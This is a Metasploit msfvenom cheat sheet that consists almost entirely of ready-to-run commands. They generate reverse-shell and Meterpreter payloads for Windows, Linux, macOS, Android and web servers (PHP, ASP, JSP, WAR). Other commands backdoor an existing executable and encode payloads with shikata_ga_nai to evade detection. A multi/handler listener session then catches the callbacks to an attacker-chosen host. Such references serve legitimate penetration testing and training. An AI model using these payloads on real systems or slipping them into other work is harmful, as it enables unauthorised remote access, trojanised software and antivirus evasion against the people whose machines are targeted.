# Msfvenom Cheat Sheet

---

![MsfVenom](/images/cheatsheet/offensive_security/msfvenom_wallpaper.png)

MsfVenom is a Metasploit standalone payload generator as a replacement for msfpayload and msfencode.

### Binaries

Info					  | Commands
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Creates a simple TCP Payload for Windows  | ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe ```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Creates a simple HTTP Payload for Windows | ``` msfvenom -p windows/meterpreter/reverse_http LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe ```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Creates a simple TCP Shell for Linux      | ``` msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f elf > example.elf ```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Creates a simple TCP Shell for Mac        | ``` msfvenom -p osx/x86/shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f macho > example.macho ```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Creats a simple TCP Payload for Android   | ``` msfvenom -p android/meterpreter/reverse/tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} R > example.apk ```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Web Payloads

Info					  | Commands
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Creats a Simple TCP Shell for PHP | ```msfvenom -p php/meterpreter_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.php```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Creats a Simple TCP Shell for ASP | ```msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f asp > example.asp```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Creats a Simple TCP Shell for Javascript | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.jsp```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Creats a Simple TCP Shell for WAR | ```msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f war > example.war```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Windows Payloads

Info					  | Commands
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Lists all avalaible encoders | ```msfvenom -l encoders```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Binds an exe with a Payload (Backdoors an exe) | ```msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Creates a simple TCP payload with shikata_ga_nai encoder | ```msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > example.exe```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Binds an exe with a Payload and encodes it | ```msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

- How do I get the meterprater shell?

```bash
sudo msfconsole

msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf exploit(multi/handler) > set lhost 192.168.1.123
lhost => 192.168.1.123

msf exploit(multi/handler) > set lport 4444
lport => 4444

msf exploit(multi/handler) > run
```


---
[Cheat Sheet](/cheatsheet/cheatsheet_readme.md) [HOME Page](/README.md)
